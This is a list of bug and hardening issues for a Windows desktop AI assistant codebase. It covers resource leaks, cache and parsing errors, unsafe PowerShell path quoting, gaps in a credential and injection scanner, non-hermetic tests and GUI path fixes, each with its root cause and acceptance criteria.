- **Affected Files:** `src/darius_ai/core/loop_guard.py` (lines 89–101), `src/darius_ai/core/workflow_dag.py` (lines 32–78, 217–235)
- **Root Cause & Fix:** `LoopGuard` checks `len(self._warned_hashes) == 0` without ever adding cycle signatures to `_warned_hashes`, stalling escalation from `WARN` to `BLOCK`. `WorkflowDAG.execute()` runs unconditional downstream node `C` even when conditional upstream `B` was skipped, and `_safe_eval_condition()` swallows `TypeError`/AST failures silently. Record cycle keys in `_warned_hashes`, track `executed_nodes` in `WorkflowDAG`, and log condition evaluation errors.
- **Acceptance Criteria:**
  - [ ] Repeated `A -> B -> A -> B` oscillations escalate deterministically from `WARN` to `BLOCK`.
  - [ ] Nodes whose prerequisite branches were skipped are also skipped cleanly in `WorkflowDAG`.

## Issue W2-27: `[BUG] ScreenVisionEngine Leaks Win32 GDI Handles & Breaks mss 9.x Thread-Safety + VisualIntelOCR PowerShell Quote Bug, Handle Leaks & Double Tesseract Execution`
- **Labels:** `bug`, `performance`, `help wanted`
- **Affected Files:** `src/darius_ai/core/screen_vision.py` (lines 52–78, 179), `src/darius_ai/core/visual_intel_ocr.py` (lines 121, 210–216, 245–312, 338–360, 423)
- **Root Cause & Fix:** `ScreenVisionEngine` allocates persistent `mss.MSS()` at import time (leaking DC/DIB handles, caching stale monitors, failing across worker threads on `mss 9.x`). `VisualIntelOCR` interpolates single-quoted `$filePath` directly into PowerShell without `CREATE_NO_WINDOW`, contains an empty `winrt` `pass` stub, leaks `Image.open()` descriptors, and runs `tesseract.exe` twice per call. Use `with mss.mss() as sct:` per capture; pass OCR paths safely via args/env with `CREATE_NO_WINDOW`; wrap `Image.open()` in `with`; parse text from `image_to_data` once.
- **Acceptance Criteria:**
  - [ ] Zero persistent `mss` GDI handles held between screen captures.
  - [ ] Paths containing apostrophes (`'`) work cleanly under WinRT OCR with zero console flashes.

## Issue W2-28: `[BUG] windows_commands.py Unreachable fallback_cmd, Shadowed return_output Flags, Ignored Non-Zero Exit Codes & Hardcoded Dummy Handlers`
- **Labels:** `bug`, `help wanted`
- **Affected Files:** `src/darius_ai/system/windows_commands.py` (lines 441–464, 643–688, 882, 1641–1653, 1694–1699, 1822–1886, 1896–1937)
- **Root Cause & Fix:** Missing browser executables fall through `_launch()` to `Popen([_CMD, "/c", cmd])` (succeeding to launch `cmd.exe`), leaving `fallback_cmd` dead code and failing on spaces in `C:\Program Files\...`; 6 actions set conflicting `open_window=True` + `return_output=True`; `run_action()` discards `result.returncode`; `apagar monitor` calls unbundled `nircmd.exe`; Python handlers hardcode dummy targets (`"inteligencia artificial"`, `"gaming_rig"`). Check `Path(cmd).is_file()` before launch, enforce `result.returncode == 0`, resolve conflicting flags, use native `SendMessageW` for monitor power, and forward caller arguments.
- **Acceptance Criteria:**
  - [ ] `fallback_cmd` launches installed browsers reliably when hardcoded `Program Files` paths are absent.
  - [ ] Failed subcommands return `(False, ...)` rather than `(True, stderr)`.

## Issue W2-29: `[BUG] WebSearchEngine Wrong DDG Selector (result__a), Cache Truncation & Missing Lock + Cache Bugs in NewsSentinel, AirTrafficSentinel & SeismicSensor`
- **Labels:** `bug`, `help wanted`, `good first issue`
- **Affected Files:** `src/darius_ai/core/web_search_engine.py` (lines 90–108, 225–241), `src/darius_ai/core/news_sentinel.py` (lines 148–155, 181–183), `src/darius_ai/core/air_traffic_sentinel.py` (line 238), `src/darius_ai/core/seismic_sensor.py` (line 128)
- **Root Cause & Fix:** `WebSearchEngine` searches `result__(url|title)` instead of `a.result__a` (returning URLs as titles), caches `results[:max_results]` poisoning larger follow-ups, mutates `_cache` unlocked, and gets re-instantiated per call; `NewsSentinel` has identical `limit` cache truncation; `AirTrafficSentinel` and `SeismicSensor` test `bool(self._cache_data)` instead of `_cache_timestamp > 0`, failing to cache empty `[]` results.
- **Acceptance Criteria:**
  - [ ] Search titles extract from `a.result__a` and small-limit calls never truncate subsequent larger-limit queries.
  - [ ] Empty API responses cache properly within TTL windows.

## Issue W2-30: `[BUG] Oracle Parsing & Routing Bugs: SpaceWeather Kp==0.0 Crash, ScienceOracle "3.704.4" Formatting, LexiconOracle Accents & ComplexityRouter Bullet Regex`
- **Labels:** `bug`, `help wanted`, `good first issue`
- **Affected Files:** `src/darius_ai/core/space_weather_oracle.py` (lines 158–165), `src/darius_ai/core/science_oracle.py` (lines 21–29), `src/darius_ai/core/lexicon_oracle.py` (lines 267–373, 462–478), `src/darius_ai/core/complexity_router.py` (lines 48–58, 114)
- **Root Cause & Fix:** `raw_kp = last_entry.get("Kp") or ...` treats `0.0` as missing and raises `ValueError`; `_format_number_es(3704.4, 1)` returns `"3.704.4"`; `LexiconOracle.lookup()` omits diacritic stripping (`"entropía"` misses `"entropia"`); `ComplexityRouter` regex `[-*•\d+\.]` counts digits/dots/`+` as bullets and lacks English reasoning/creative keywords.
- **Acceptance Criteria:**
  - [ ] `Kp == 0.0` parses cleanly; `_format_number_es(3704.4, 1)` produces `"3.704,4"`; accented terms match curated definitions; English prompts score accurately in `ComplexityRouter`.

## Issue W2-31: `[BUG] Audio Cache & Timer Reliability: Unbounded tts_cache + .tmp Race, ElevenLabs Non-PCM Static Corruption & DariusTimerManager Wall-Clock Drift / 20 Hz Polling`
- **Labels:** `bug`, `performance`, `help wanted`
- **Affected Files:** `src/darius_ai/audio/tts_cache.py` (lines 28–75), `src/darius_ai/audio/elevenlabs_tts_engine.py` (lines 45–59, 136, 150–164), `src/darius_ai/core/darius_timer.py` (lines 56–163, 180–219), `src/darius_ai/gui/app.py` (lines 2709–2724)
- **Root Cause & Fix:** `tts_cache` grows without quota/LRU eviction and temp filenames lack thread/UUID disambiguation; `ElevenLabsTTS` passes non-PCM `output_format` bytes directly into WAV/`int16` playback (playing static) and misses URL encoding; `DariusTimerManager` uses `time.time()` instead of `time.monotonic()`, leaks expired callbacks, polls at 20 Hz when idle, blocks on callbacks, never restarts after `stop_all()`, and isn't stopped in `kill_process()`.
- **Acceptance Criteria:**
  - [ ] Disk cache respects a bounded size/count LRU cap and thread-safe temp paths; non-PCM ElevenLabs formats are decoded or rejected safely; timers use `time.monotonic()` + `Condition.wait`.

## Issue W2-32: `[SECURITY] Hardening Gaps in security_guard.py (github_pat_ & Windows Shell Rules), SkillRegistry (Prompt Injection & Unenforced Tier) & AntigravityAgentBridge (Unbounded Streaming Timeout)`
- **Labels:** `security`, `enhancement`, `help wanted`
- **Affected Files:** `src/darius_ai/core/security_guard.py` (lines 198, 358–362), `src/darius_ai/core/skill_registry.py` (lines 63–110), `src/darius_ai/core/antigravity_bridge.py` (lines 83–123, 155–187), `src/darius_ai/core/ai_client.py` (lines 411–420, 939–946)
- **Root Cause & Fix:** `CredentialStripper` misses `github_pat_` tokens; `InjectionScanner` `shell_execution` lacks `(?i)` and Windows `&`/LOLBins; `SkillRegistry` injects `.md` metadata unsanitized on every turn, hardcodes `parameters=[]`, doesn't purge deleted skills, and ignores `required_tier` in `agent_planner`; `AntigravityAgentBridge` wraps only `agent.chat()` (not stream iteration) in a timeout while holding `self._lock`, and lacks `InjectionScanner`/`CredentialStripper`.
- **Acceptance Criteria:**
  - [ ] Fine-grained GitHub tokens redact cleanly; skills validate against `InjectionScanner` and `RiskTier`; Antigravity streaming stays bounded under `asyncio.timeout`.

## Issue W2-33: `[TESTS] Non-Hermetic Tests Wipe Real Developer API Keys & Mutate Obsidian Vault + self_test.py False PASS and Real .darius_data Side Effects`
- **Labels:** `bug`, `testing`, `help wanted`, `good first issue`
- **Affected Files:** `tests/test_byok_providers.py` (lines 151–157, 263–292, 412–415, 466–468), `tests/test_config_loader.py` (lines 57–63, 75–100), `tests/conftest.py`, `src/darius_ai/core/self_test.py` (lines 8, 130–137, 181–186, 225, 381–395)
- **Root Cause & Fix:** Un-isolated tests overwrite `.darius_data/config.json` (wiping `openai_api_key` and mutating language) and write test notes into the user's real Obsidian vault; `self_test.py` prints `PASS` even when `google-antigravity` or `_CMD_PATTERNS` fail and creates real `.darius_data/` SQLite DBs. Isolate `cfg` + `obsidian_brain` + env vars via an `autouse` fixture in `conftest.py` and run `self_test.py` DB checks inside `TemporaryDirectory()`.
- **Acceptance Criteria:**
  - [ ] Running `pytest` never touches real `.darius_data/config.json` or Obsidian notes; `self_test.py` accurately reports `WARN` when optional packages/imports fail.

## Issue W2-34: `[BUG] GUI Polish, Dead References & Docs Fixes: Wrong darius.ico/darius.log Paths, 60 FPS Voice Capsule Thrashing, TelemetryBar Leak & Stale docs/script.js`
- **Labels:** `bug`, `documentation`, `performance`, `help wanted`, `good first issue`
- **Affected Files:** `src/darius_ai/gui/app.py` (lines 249–254, 846, 1297, 1316–1319, 1458–1460, 1544, 1625, 1724–1728, 2287–2288), `src/darius_ai/gui/floating_voice_capsule.py` (lines 314–359), `src/darius_ai/gui/telemetry_bar.py` (lines 132–150), `src/darius_ai/gui/bento_dashboard.py` (lines 384, 507–524, 849), `docs/script.js` (lines 55, 124–149), `docs/index.es.html` (lines 37, 107, 162, 262, 279, 286)
- **Root Cause & Fix:** Fix icon/log paths (`get_app_resource_dir() / "assets/darius.ico"` and `LOG_FILE`); add dirty-state guard to `FloatingVoiceCapsule.set_mic_active()`; unsubscribe & cancel timer in `TelemetryBarWidget.destroy()`; deduplicate `_cmd_screen_vision` chat output and PTT `pa.terminate()`; fix `docs/script.js` language-aware `"✓ Copied"` + sync `docs/index.es.html` to `v8.5.0`.
- **Acceptance Criteria:**
  - [ ] App icon and live Logs viewer resolve valid paths; idle CPU usage drops via dirty-checked `set_mic_active`; docs assets match v8.5.0.

## Issue W2-35: `[BUG] Network, Diagnostics & Hygiene: wol_dispatcher Broadcast Abort & Fake MACs, darius_protocol Fake Audio PASS, Unescaped YAML Frontmatter & Hardcoded Icon Path`
- **Labels:** `bug`, `enhancement`, `help wanted`, `good first issue`
- **Affected Files:** `src/darius_ai/system/wol_dispatcher.py` (lines 55–84, 174–192, 239–246), `src/darius_ai/core/darius_protocol.py` (lines 39, 142–144, 189, 228–241), `src/darius_ai/system/media_controller.py` (lines 304–305), `src/darius_ai/core/daily_digest.py` (lines 101, 122), `src/darius_ai/core/user_profile_engine.py` (lines 131–143, 238), `src/darius_ai/core/obsidian_brain.py` (lines 145–155), `src/darius_ai/core/target_dossier.py` (lines 57–81), `assets/generate_icon.py` (line 34), `src/darius_ai/core/ai_client.py` (lines 625, 672–765, 858–860, 900–906)
- **Root Cause & Fix:** Isolate per-interface UDP `sendto` in `wol_dispatcher` and load real target MACs from config; fix `darius_protocol` audio/CPU error masking; avoid blind `VK_MEDIA_PLAY_PAUSE` in `search_and_play_youtube()`; replace hardcoded `"Óscar"` in `daily_digest.py` and developer OneDrive path in `assets/generate_icon.py`; safely serialize YAML frontmatter scalars; short-circuit 401/403 retries and strip leaked `[ACTION:]` tags on tool loop fallback in `ai_client.py`.
- **Acceptance Criteria:**
  - [ ] WOL continues broadcasting across working NICs if one interface errors; YAML frontmatter escapes newlines/colons cleanly; `ai_client.py` fails fast on 401/403 and strips raw `[ACTION:]` tags on errors.
